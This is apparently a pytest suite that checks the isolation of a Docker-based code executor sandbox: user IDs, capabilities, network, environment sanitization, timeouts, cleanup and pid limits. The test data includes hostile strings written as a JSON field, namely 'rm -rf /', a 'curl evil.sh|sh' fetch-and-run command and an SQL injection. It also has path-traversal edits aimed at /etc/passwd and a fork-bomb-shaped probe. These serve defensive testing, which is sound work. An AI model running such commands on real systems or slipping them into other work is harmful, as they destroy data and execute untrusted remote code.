"""CYVRIX V3.4 — REAL container sandbox tests (§72/§110/§111).

Runs the actual pinned executor image under the actual Docker daemon and
asserts isolation from BOTH sides:
- inside: probes.json evidence (UID, caps, network, filesystem,
  docker socket, privilege escalation, environment)
- host: bounded output, container removal, workspace teardown, audit

Every critical assertion fails the test — a sandbox that cannot PROVE
isolation is treated as no isolation (fail closed).

These tests require a reachable Linux Docker daemon. On hosts without
one they SKIP (explicitly reported, never silently).
"""
import json
import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "apps", "api"))

pytestmark = pytest.mark.skipif(
    os.environ.get("RUN_SANDBOX_TESTS") != "1",
    reason="Real-container tests require RUN_SANDBOX_TESTS=1 + Linux Docker",
)

from app.services import sandbox as sandbox_svc
from app.services import workspace as wsvc


def _docker_available():
    try:
        client = sandbox_svc._get_docker_client()
        info = client.info()
        return info.get("OSType") == "linux", client
    except Exception:
        return False, None


@pytest.fixture(scope="module")
def docker_env():
    ok, client = _docker_available()
    if not ok:
        pytest.skip("Linux Docker daemon not reachable — real-container tests NOT run")
    yield client


@pytest.fixture(scope="module")
def platform_ok(docker_env):
    return sandbox_svc.check_platform_support(docker_env)


@pytest.fixture(scope="module")
def executor_image(docker_env):
    return sandbox_svc.ensure_executor_image(docker_env)


@pytest.fixture(autouse=True)
def _sweep_sandboxes(docker_env):
    """Crash-hygiene: no cyvrix sandbox container survives a test."""
    yield
    sandbox_svc.sweep_orphan_sandboxes(docker_env)


MALICIOUS_PACKAGE_JSON = '{\n  "lodash": "4.17.19",\n  "comment": "$(rm -rf /) ; `curl evil.sh|sh` ; \\"; DROP TABLE users;--"\n}\n'


def _make_workspace(files: dict) -> str:
    ws = wsvc.new_workspace_dir()
    for rel, content in files.items():
        target = os.path.join(ws, *rel.split("/"))
        os.makedirs(os.path.dirname(target) or ws, exist_ok=True)
        with open(target, "w", encoding="utf-8", newline="") as fh:
            fh.write(content)
    return ws


class TestRealSandboxIsolation:
    def test_uid_gid_nonroot(self, docker_env, platform_ok, executor_image):
        ws = _make_workspace({"package.json": MALICIOUS_PACKAGE_JSON})
        sandbox = None
        try:
            sandbox = sandbox_svc.create_sandbox(ws, docker_env, platform_ok)
            result = sandbox_svc.run_executor(sandbox, 60)
            assert not result.timed_out
            probes = sandbox_svc.read_probe_results(ws)
            assert probes is not None, "no probe evidence produced"
            assert probes["uid"]["uid"] != 0
            assert probes["uid"]["uid"] == sandbox_svc.SANDBOX_UID
            assert probes["uid"]["gid"] == sandbox_svc.SANDBOX_GID
        finally:
            if sandbox is not None:
                sandbox_svc.destroy_sandbox(sandbox)
            wsvc.remove_workspace_dir(ws)

    def test_capabilities_dropped(self, docker_env, platform_ok, executor_image):
        ws = _make_workspace({"package.json": MALICIOUS_PACKAGE_JSON})
        try:
            sandbox = sandbox_svc.create_sandbox(ws, docker_env, platform_ok)
            sandbox_svc.run_executor(sandbox, 60)
            probes = sandbox_svc.read_probe_results(ws)
            assert probes is not None
            caps = probes.get("capabilities", {})
            assert caps.get("CapEff") == "0000000000000000" or \
                caps.get("CapEff") == "0", caps
            assert caps.get("CapBnd") == "0000000000000000" or \
                caps.get("CapBnd") == "0", caps
        finally:
            wsvc.remove_workspace_dir(ws)

    def test_no_new_privs_and_setuid_fails(self, docker_env, platform_ok, executor_image):
        ws = _make_workspace({"package.json": MALICIOUS_PACKAGE_JSON})
        try:
            sandbox = sandbox_svc.create_sandbox(ws, docker_env, platform_ok)
            sandbox_svc.run_executor(sandbox, 60)
            probes = sandbox_svc.read_probe_results(ws)
            assert probes["privilege_escalation"]["setuid_root"].startswith("DENIED")
        finally:
            wsvc.remove_workspace_dir(ws)

    def test_network_off(self, docker_env, platform_ok, executor_image):
        ws = _make_workspace({"package.json": MALICIOUS_PACKAGE_JSON})
        try:
            sandbox = sandbox_svc.create_sandbox(ws, docker_env, platform_ok)
            sandbox_svc.run_executor(sandbox, 60)
            probes = sandbox_svc.read_probe_results(ws)
            net = probes["network"]
            for target in ("internet", "private", "loopback", "internal_dns"):
                assert str(net[target]).startswith("DENIED"), net
        finally:
            wsvc.remove_workspace_dir(ws)

    def test_no_docker_socket_no_host_fs(self, docker_env, platform_ok, executor_image):
        ws = _make_workspace({"package.json": MALICIOUS_PACKAGE_JSON})
        try:
            sandbox = sandbox_svc.create_sandbox(ws, docker_env, platform_ok)
            sandbox_svc.run_executor(sandbox, 60)
            probes = sandbox_svc.read_probe_results(ws)
            assert probes["docker_socket"]["exists"] is False
            assert probes["root_fs_readonly"]["writable"] is False
            # source code of the platform is not visible in the sandbox
            assert probes["host_fs"]["cyvrix_src_visible"] is False
        finally:
            wsvc.remove_workspace_dir(ws)

    def test_environment_sanitized(self, docker_env, platform_ok, executor_image):
        ws = _make_workspace({"package.json": MALICIOUS_PACKAGE_JSON})
        try:
            sandbox = sandbox_svc.create_sandbox(ws, docker_env, platform_ok)
            sandbox_svc.run_executor(sandbox, 60)
            probes = sandbox_svc.read_probe_results(ws)
            names = probes["env_split"]["env_names"]
            banned = ("SECRET_KEY", "GITHUB_APP_PRIVATE_KEY", "DATABASE_URL",
                      "REDIS_URL", "OPENAI_API_KEY", "EXECUTOR_SERVICE_TOKEN",
                      "LD_PRELOAD", "NODE_OPTIONS", "PYTHONPATH")
            for b in banned:
                assert b not in names, b
            assert probes["env"]["dangerous_vars"] == []
        finally:
            wsvc.remove_workspace_dir(ws)

    def test_structured_operation_executes_in_real_container(
        self, docker_env, platform_ok, executor_image,
    ):
        ws = _make_workspace({"package.json": '{\n  "lodash": "4.17.19"\n}\n'})
        try:
            sandbox_svc.write_operations_payload(
                ws, ["package.json"],
                [{"type": "UPDATE_DEPENDENCY_VERSION", "file": "package.json",
                  "name": "lodash", "ecosystem": "npm",
                  "from_version": "4.17.19", "to_version": "4.17.21"}])
            sandbox = sandbox_svc.create_sandbox(ws, docker_env, platform_ok)
            result = sandbox_svc.run_executor(sandbox, 60)
            assert not result.timed_out
            assert result.exit_code == 0, result.stderr[:500]
            raw = sandbox_svc.read_executor_result(ws)
            assert raw is not None and raw.get("ok") is True
            with open(os.path.join(ws, "package.json"), encoding="utf-8") as fh:
                assert '"lodash": "4.17.21"' in fh.read()
        finally:
            wsvc.remove_workspace_dir(ws)


class TestRealSandboxContainment:
    def test_traversal_and_symlink_attacks_fail_in_container(
        self, docker_env, platform_ok, executor_image,
    ):
        ws = _make_workspace({"package.json": MALICIOUS_PACKAGE_JSON})
        try:
            # attack payload: operations referencing paths outside scope
            # (the executor must deny; the host sees ok=False, file intact)
            sandbox_svc.write_operations_payload(ws, ["package.json"], [
                {"type": "REPLACE_TEXT", "file": "../../../etc/passwd",
                 "old_text": "root", "new_text": "pwn"},
                {"type": "REPLACE_TEXT", "file": "/etc/passwd",
                 "old_text": "root", "new_text": "pwn"},
            ])
            sandbox = sandbox_svc.create_sandbox(ws, docker_env, platform_ok)
            result = sandbox_svc.run_executor(sandbox, 60)
            assert result.exit_code == 0  # executor handles denial gracefully
            raw = sandbox_svc.read_executor_result(ws)
            assert raw is not None and raw.get("ok") is False
            assert raw.get("reason_code") in ("ACTION_SCOPE_VIOLATION",
                                              "SANDBOX_ESCAPE_ATTEMPT")
        finally:
            wsvc.remove_workspace_dir(ws)

    def test_timeout_kills_runaway_container(self, docker_env, platform_ok, executor_image):
        """A payload that would spin forever is terminated by the hard
        timeout; the container is destroyed; nothing survives (§31)."""
        ws = _make_workspace({"package.json": MALICIOUS_PACKAGE_JSON})
        try:
            # payload missing result → executor would finish quickly; to
            # test timeout we need a long-running process INSIDE. We use
            # the run_executor timeout against a container whose command
            # we override to sleep.
            client = docker_env
            import docker.types
            seccomp = json.dumps(sandbox_svc._load_seccomp_profile())
            container = client.containers.create(
                image=executor_image,
                # override the image ENTRYPOINT so the payload itself runs
                entrypoint=["/usr/local/bin/python", "-I", "-c"],
                command=["import time; time.sleep(300)"],
                user=f"{sandbox_svc.SANDBOX_UID}:{sandbox_svc.SANDBOX_GID}",
                network_mode="none",
                cap_drop=["ALL"],
                security_opt=["no-new-privileges", f"seccomp={seccomp}"],
                read_only=True,
                mem_limit="256m",
                pids_limit=32,
                nano_cpus=500_000_000,
                labels={"cyvrix.sandbox": "executor"},
            )
            sandbox = {"container": container}
            import time as _time
            start = _time.time()
            result = sandbox_svc.run_executor(sandbox, timeout_seconds=3)
            elapsed = _time.time() - start
            assert result.timed_out is True
            assert elapsed < 30  # killed promptly, not after 300s
            destroyed, detail = sandbox_svc.destroy_sandbox(sandbox)
            assert destroyed, detail
        finally:
            wsvc.remove_workspace_dir(ws)

    def test_cleanup_guarantee(self, docker_env, platform_ok, executor_image):
        ws = _make_workspace({"package.json": MALICIOUS_PACKAGE_JSON})
        try:
            sandbox = sandbox_svc.create_sandbox(ws, docker_env, platform_ok)
            cid = sandbox["container"].id
            sandbox_svc.run_executor(sandbox, 60)
            destroyed, detail = sandbox_svc.destroy_sandbox(sandbox)
            assert destroyed, detail
            client = docker_env
            try:
                client.containers.get(cid)
                pytest.fail("container survived teardown")
            except Exception:
                pass  # gone — correct
            # crash hygiene: sweep any orphans from earlier crashes, then
            # assert the system is clean (no NEW leaks from this run)
            sandbox_svc.sweep_orphan_sandboxes(client)
            leftovers = client.containers.list(
                all=True, filters={"label": "cyvrix.sandbox=executor"})
            assert not leftovers
        finally:
            wsvc.remove_workspace_dir(ws)

    def test_host_unaffected_during_run(self, docker_env, platform_ok, executor_image):
        """While the sandbox runs: bounded processes on host, workspace
        inside the sandbox root only (§111)."""
        ws = _make_workspace({"package.json": MALICIOUS_PACKAGE_JSON})
        try:
            sandbox = sandbox_svc.create_sandbox(ws, docker_env, platform_ok)
            sandbox_svc.run_executor(sandbox, 60)
            # workspace still inside the sandbox root
            root = os.path.realpath(
                os.environ.get("CYVRIX_SANDBOX_WORKSPACE_ROOT")
                or os.path.join(__import__("tempfile").gettempdir(),
                                "cyvrix-sandboxes"))
            assert os.path.realpath(ws).startswith(root)
            wsvc.remove_workspace_dir(ws)
            assert not os.path.exists(ws)
        finally:
            try:
                wsvc.remove_workspace_dir(ws)
            except Exception:
                pass

    def test_pid_limit_stops_fork_bomb_shape(self, docker_env, platform_ok, executor_image):
        """A payload that spawns unbounded processes hits pids_limit and
        dies; the host and container teardown remain healthy (§27)."""
        client = docker_env
        import docker.types
        seccomp = json.dumps(sandbox_svc._load_seccomp_profile())
        # fork-bomb-shaped harmless probe: spawn up to N children sleeping
        payload = (
            "import os,sys,time\n"
            "kids=0\n"
            "try:\n"
            "    for i in range(200):\n"
            "        pid=os.fork()\n"
            "        if pid==0:\n"
            "            time.sleep(60)\n"
            "        kids+=1\n"
            "except OSError:\n"
            "    pass\n"
            "print('spawned', kids)\n"
            "time.sleep(1)\n"
        )
        container = client.containers.create(
            image=executor_image,
            entrypoint=["/usr/local/bin/python", "-I", "-c"],
            command=[payload],
            user=f"{sandbox_svc.SANDBOX_UID}:{sandbox_svc.SANDBOX_GID}",
            network_mode="none",
            cap_drop=["ALL"],
            security_opt=["no-new-privileges", f"seccomp={seccomp}"],
            read_only=True,
            mem_limit="256m",
            pids_limit=32,
            nano_cpus=500_000_000,
            labels={"cyvrix.sandbox": "executor"},
        )
        sandbox = {"container": container}
        result = sandbox_svc.run_executor(sandbox, timeout_seconds=30)
        assert not result.timed_out
        out = result.stdout.decode("utf-8", errors="replace")
        # pids_limit(32) must cap the spawn count far below 200
        assert "spawned" in out
        kids = int(out.split("spawned")[1].strip().split()[0])
        assert kids < 200, f"fork bomb not contained: {kids} children"
        destroyed, detail = sandbox_svc.destroy_sandbox(sandbox)
        assert destroyed, detail
